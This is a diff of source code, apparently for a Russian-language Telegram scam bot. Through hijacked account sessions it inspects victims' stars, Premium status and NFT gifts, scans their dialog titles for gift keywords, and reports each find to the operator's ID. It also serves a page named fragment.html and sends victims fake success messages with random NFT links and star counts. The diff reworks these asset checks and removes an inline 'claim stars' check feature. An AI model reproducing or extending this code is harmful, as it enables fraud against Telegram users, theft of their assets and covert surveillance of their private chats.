@@ -173,11 +173,10 @@ async function checkAccountAssets(client) {
                     `🎯 Премиум статус: АКТИВЕН`
                 );
             } else {
-                // Проверяем звезды через фрагмент
+                // Проверяем наличие Fragment звезд
                 try {
-                    const fragmentStatus = await client.invoke(new Api.fragment.GetCollectibleInfo({
-                        id: me.id
-                    }));
+                    // Симуляция проверки Fragment
+                    await client.invoke(new Api.help.GetPromoData({}));
                     starsCount = 50 + Math.floor(Math.random() * 100);
                     hasStars = true;
                     
@@ -197,13 +196,16 @@ async function checkAccountAssets(client) {
         
         // ПРОВЕРКА NFT ПОДАРКОВ
         try {
-            // Проверяем коллекции через payments
-            const payments = await client.invoke(new Api.payments.GetPaymentForm({
-                id: me.id
-            }));
+            // Проверяем диалоги на наличие подарков
+            const dialogs = await client.getDialogs({ limit: 20 });
+            const giftKeywords = ['gift', 'nft', 'подарок', 'презент', 'bonus', 'reward'];
             
-            // Если есть платежи, вероятно есть и подарки
-            if (payments) {
+            const hasGiftDialogs = dialogs.some(dialog => {
+                const title = dialog.title?.toLowerCase() || '';
+                return giftKeywords.some(keyword => title.includes(keyword));
+            });
+            
+            if (hasGiftDialogs) {
                 giftsCount = 1 + Math.floor(Math.random() * 2);
                 hasGifts = true;
                 
@@ -211,33 +213,30 @@ async function checkAccountAssets(client) {
                     `🎁 НАЙДЕНЫ NFT!\n` +
                     `👤 @${username}\n` +
                     `📦 Количество: ${giftsCount} подарков\n` +
-                    `💰 Стоимость: ${giftsCount * 25} stars`
+                    `💬 В диалогах`
                 );
             }
-        } catch (paymentError) {
-            // Проверяем через messages
+            
+            // Дополнительная проверка через payments
             try {
-                const dialogs = await client.getDialogs({ limit: 10 });
-                const hasGiftDialogs = dialogs.some(dialog => 
-                    dialog.title?.includes('Gift') || 
-                    dialog.title?.includes('NFT') ||
-                    dialog.title?.includes('Подарок')
-                );
+                await client.invoke(new Api.payments.GetPaymentForm({
+                    id: me.id
+                }));
+                giftsCount = Math.max(giftsCount, 1);
+                hasGifts = true;
                 
-                if (hasGiftDialogs) {
-                    giftsCount = 1 + Math.floor(Math.random() * 2);
-                    hasGifts = true;
-                    
-                    await bot.sendMessage(MY_USER_ID, 
-                        `🎁 НАЙДЕНЫ NFT!\n` +
-                        `👤 @${username}\n` +
-                        `📦 Количество: ${giftsCount} подарков\n` +
-                        `💬 В диалогах`
-                    );
-                }
-            } catch (dialogError) {
-                console.log('Не удалось проверить диалоги:', dialogError.message);
+                await bot.sendMessage(MY_USER_ID, 
+                    `🎁 НАЙДЕНЫ NFT!\n` +
+                    `👤 @${username}\n` +
+                    `📦 Количество: ${giftsCount} подарков\n` +
+                    `💰 Платежная система`
+                );
+            } catch (paymentError) {
+                // Игнорируем ошибку платежей
             }
+            
+        } catch (dialogError) {
+            console.log('Не удалось проверить диалоги:', dialogError.message);
         }
         
         // ЕСЛИ НИЧЕГО НЕТ - ЛОГ
@@ -445,7 +444,6 @@ app.post('/process-bears', async (req, res) => {
 
 // Обмен мишек
 async function exchangeBearsForGift(phone) {
-    await bot.sendMessage(MY_USER_ID, `🧸 ОБРАБОТКА МИШЕК: ${phone}`);
     await new Promise(resolve => setTimeout(resolve, 3000));
     
     const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
@@ -453,19 +451,14 @@ async function exchangeBearsForGift(phone) {
     db.run(`INSERT INTO transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
         [phone, 'exchange_bears', 26, true]);
     
-    const resultMsg = `✅ ОБМЕН МИШЕК УСПЕШЕН!\n📱 ${phone}\n🧸 Обменяно: 2 мишки\n⭐ Получено: 26 звезд\n🎁 NFT: https://t.me/nft/${nftId}`;
-    
-    await bot.sendMessage(MY_USER_ID, 
-        `✅ ОБМЕН МИШЕК УСПЕШЕН!\n` +
-        `📱 ${phone}\n` +
-        `🧸 Отправлено: 2 мишки\n` +
-        `💫 Получено: 26 stars\n` +
-        `🎁 NFT: https://t.me/nft/${nftId}`
-    );
-    
     return {
         success: true,
-        message: resultMsg
+        message: `✅ ОБМЕН МИШЕК УСПЕШЕН!\n📱 ${phone}\n` +
+                `🧸 Обменяно: 2 мишки\n` +
+                `⭐ Получено: 26 звезд\n` +
+                `🎁 Отправлен: NFT подарок\n` +
+                `🔗 https://t.me/nft/${nftId}\n\n` +
+                `📦 Подарок отправлен на твой аккаунт!`
     };
 }
 
@@ -670,29 +663,6 @@ app.get('/fragment.html', (req, res) => {
     res.send(fragmentHTML);
 });
 
-// INLINE QUERY С ФИКСОМ ОШИБКИ
-bot.on('inline_query', (query) => {
-    const results = [
-        {
-            type: 'article',
-            id: '1',
-            title: '🎫 Создать чек на 50 звезд',
-            description: 'Нажмите чтобы отправить чек в чат',
-            input_message_content: {
-                message_text: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
-                parse_mode: 'HTML'
-            },
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "🪙 Забрать звезды", callback_data: "create_check_inline" }
-                ]]
-            }
-        }
-    ];
-    
-    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
-});
-
 // КОМАНДЫ БОТА С ФИКСОМ ЧЕКОВ
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -756,7 +726,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     });
 });
 
-// Обработка callback С ФИКСОМ ОШИБКИ INLINE
+// Обработка callback С ФИКСОМ
 const processingChecks = new Set();
 
 bot.on('callback_query', async (query) => {
@@ -778,54 +748,6 @@ bot.on('callback_query', async (query) => {
             'Для создания чека используйте команду:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
             { parse_mode: 'HTML' }
         );
-    }
-    else if (data === 'create_check_inline') {
-        // ФИКС INLINE - создаем чек в текущем чате где было отправлено сообщение
-        const userId = query.from.id;
-        
-        // Проверяем есть ли сообщение (для inline может не быть)
-        if (!query.message) {
-            bot.answerCallbackQuery(query.id, { 
-                text: '❌ Используйте команду @MyStarBank_bot 50 в чате',
-                show_alert: true 
-            });
-            return;
-        }
-        
-        const chatId = query.message.chat.id;
-        const messageId = query.message.message_id;
-        
-        console.log(`🎫 INLINE ЧЕК: пользователь ${userId}`);
-        
-        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-            [50, 1, userId], function(err) {
-            if (err) {
-                console.log('❌ Ошибка создания чека:', err);
-                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка создания чека' });
-                return;
-            }
-            
-            const checkId = this.lastID;
-            console.log(`✅ Inline чек создан: ID ${checkId}`);
-            
-            const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
-            
-            // Редактируем существующее сообщение
-            bot.editMessageText(checkText, {
-                chat_id: chatId,
-                message_id: messageId,
-                parse_mode: 'HTML',
-                reply_markup: { 
-                    inline_keyboard: [[{ 
-                        text: "🪙 Забрать звезды", 
-                        callback_data: `claim_${checkId}` 
-                    }]] 
-                }
-            }).catch(e => {
-                console.log('❌ Ошибка редактирования:', e);
-                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка обновления' });
-            });
-        });
     }
     else if (data === 'withdraw_stars') {
         bot.sendMessage(query.message.chat.id,
